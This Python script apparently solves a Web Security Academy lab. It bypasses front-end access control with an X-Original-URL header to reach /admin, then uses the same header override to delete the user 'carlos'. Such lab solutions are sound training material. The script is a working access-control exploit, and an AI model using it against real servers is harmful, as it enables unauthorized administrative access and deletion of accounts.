from web_security_academy.core.utils import *

from urllib.parse import urlencode
from bs4 import BeautifulSoup


def solve_lab(session, *args):
    headers = {"X-Original-URL": "/admin"}
    print_info(f'Visiting "{session.url}" with the following headers...')
    print(headers)
    resp = session.get_path("/", headers=headers)

    if resp.status_code != 200:
        print_fail("Did not get the expected 200 status code.")
    else:
        print_success("GET request sent successfully.\n")

    print_info("Using the response to find path to delete the user carlos...")
    soup = BeautifulSoup(resp.text, "html.parser")
    tag = soup.find(lambda tag: tag.has_attr("href") and "carlos" in tag.get("href"))

    if tag is None:
        print_fail("Unable to find path.")
    else:
        delete = tag.get("href")
        url, params = delete.split("?")
        print_success(f"Found path: {delete}\n")

    headers = {"X-Original-URL": url}
    print_info(f'Visiting "{session.url}?{params}" with the following headers...')
    print(f"{headers}\n")
    session.get_path(f"/?{params}", headers=headers)
